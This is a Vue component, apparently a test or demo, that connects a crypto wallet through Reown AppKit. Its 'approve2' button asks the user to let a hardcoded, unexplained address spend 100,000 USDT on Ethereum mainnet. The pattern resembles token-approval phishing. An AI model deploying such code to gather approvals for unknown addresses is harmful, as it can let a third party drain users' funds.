<script setup lang="ts">
import { createAppKit, useAppKit, useAppKitProvider, useAppKitAccount } from '@reown/appkit/vue'
import { EthersAdapter } from '@reown/appkit-adapter-ethers'
import { mainnet, arbitrum } from '@reown/appkit/networks'
import { BrowserProvider, Contract } from 'ethers'

// 1. Get projectId from https://cloud.reown.com
const projectId = '4703d1a7a30b63665f8d8e8339a9aceb'

// 2. Create your application's metadata object
const metadata = {
  name: 'My Website',
  description: 'My Website description',
  url: 'https://mywebsite.com', // url must match your domain & subdomain
  icons: ['https://avatars.mywebsite.com/']
}

// 3. Create a AppKit instance
createAppKit({
  adapters: [new EthersAdapter()],
  networks: [mainnet, arbitrum],
  metadata,
  projectId,
  features: {
    analytics: true // Optional - defaults to your Cloud configuration
  }
})

// 4. Use modal composable
const modal = useAppKit()

const USDTAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

// The ERC-20 Contract ABI, which is a common contract interface
// for tokens (this is the Human-Readable ABI format)
const USDTAbi = [
  'function name() view returns (string)',
  'function symbol() view returns (string)',
  'function balanceOf(address) view returns (uint)',
  'function transfer(address to, uint amount)',
  'event Transfer(address indexed from, address indexed to, uint amount)',
  'function approve(address spender, uint256 amount) returns (bool)'
]

async function approve2() {
  const { address, isConnected } = useAppKitAccount()
  console.log("address = " + address + "   ----   isConnected = " + isConnected)
  const { walletProvider } = useAppKitProvider('eip155')
  try {
    const ethersProvider = new BrowserProvider(walletProvider as any)
    const signer = await ethersProvider.getSigner()
    const USDTContract = new Contract(USDTAddress, USDTAbi, signer)
    const approveResult = await USDTContract.approve(
      '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb',
      BigInt(100000000000)
    )
    console.log('Approval successful = ' + approveResult )
  } catch (error) {
    console.error('Approval failed:', error)
  }
}
</script>

<template>
  <w3m-button />
  <button @click="approve2">approve2</button>
</template>
